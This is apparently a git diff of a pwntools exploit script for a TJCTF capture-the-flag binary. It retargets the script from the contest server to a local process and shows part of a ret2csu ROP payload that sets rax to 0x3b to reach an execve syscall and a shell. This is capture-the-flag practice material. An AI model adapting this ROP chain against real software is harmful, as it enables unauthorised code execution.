@@ -1,6 +1,6 @@
 from pwn import *
 
-r = remote('p1.tjctf.org', 8001)
+r = process('./stop')
 
 offset = 282
 
@@ -43,6 +43,8 @@ payload += p64(0) # rdx value
 payload += p64(0x0000000000400930) #ret2csu 0x0000000000400930
 
 r.recvuntil('letter?')
+#r.sendline('a')
+#r.recvuntil('Category?')
 r.sendline(payload)
 r.recvuntil('yet')
 r.sendline(p64(syscall) + "A"*50) # write syscall to bss and add padding to make rax 0x3b
